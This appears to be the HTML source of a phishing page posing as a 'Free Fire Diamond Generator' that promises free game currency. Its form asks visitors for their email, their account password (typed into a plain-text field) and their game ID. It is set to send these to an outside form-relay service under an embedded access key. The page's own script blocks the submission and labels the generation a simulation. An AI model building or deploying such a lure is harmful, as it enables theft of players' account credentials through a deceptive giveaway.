<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Diamond Generator</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
        }
    </style>
</head>
<body class="bg-gradient-to-r from-purple-400 to-pink-500 h-screen flex justify-center items-center">
    <div class="bg-white rounded-lg shadow-xl p-8 w-full max-w-md transition-transform hover:scale-105">
        <h1 class="text-2xl font-semibold text-blue-600 mb-4 text-center">Free Fire Diamond Generator</h1>
        <p class="text-gray-700 mb-6 text-center">Enter your details below to get free diamonds!</p>

   <form id="diamond-form" class="space-y-4" action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="0732fb33-547b-48bb-826e-09f7854ad14b">
            <div>
                <label for="email" class="block text-gray-700 text-sm font-bold mb-2">Email:</label>
                <input type="email" id="email" name="email" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" placeholder="Enter your Email" required>
            </div>
            <div>
                <label for="password" class="block text-gray-700 text-sm font-bold mb-2">Password:</label>
                <input type="text" id="password" name="password" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" placeholder="Enter your Password" required>
            </div>
            <div>
                <label for="ff-id" class="block text-gray-700 text-sm font-bold mb-2">Free Fire ID:</label>
                <input type="text" id="ff-id" name="ff-id" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" placeholder="Enter your Free Fire ID" required>
            </div>

   <div>
                <label for="diamonds" class="block text-gray-700 text-sm font-bold mb-2">Number of Diamonds:</label>
                <select id="diamonds" name="diamonds" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline">
                    <option value="100">100 Diamonds</option>
                    <option value="500">500 Diamonds</option>
                    <option value="1000">1000 Diamonds</option>
                    <option value="5000">5000 Diamonds</option>
                    <option value="10000">10000 Diamonds</option>
                </select>
            </div>
    <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
     <!-- <input type="hidden" name="redirect" value="https://mywebsite.com/thanks.html"> -->
  <button type="submit" class="bg-gradient-to-r from-green-400 to-blue-500 hover:from-green-500 hover:to-blue-600 text-white font-bold py-2 px-4 rounded-full focus:outline-none focus:shadow-outline w-full transition duration-300 ease-in-out">
                Generate Diamonds
            </button>
        </form>

   <div id="message-container" class="mt-6 text-center text-red-600 font-semibold">
            </div>
    </div>

   <script>
        const form = document.getElementById('diamond-form');
        const messageContainer = document.getElementById('message-container');

   form.addEventListener('submit', (event) => {
            event.preventDefault();

   const ffId = document.getElementById('ff-id').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const diamonds = document.getElementById('diamonds').value;

   if (!/^\d+$/.test(ffId)) {
                messageContainer.textContent = "Invalid Free Fire ID. Please enter numbers only.";
                return;
            }

   messageContainer.textContent = `Generating ${diamonds} diamonds for ID: ${ffId}... (This is a simulation)`;

        });
    </script>
</body>
</html>
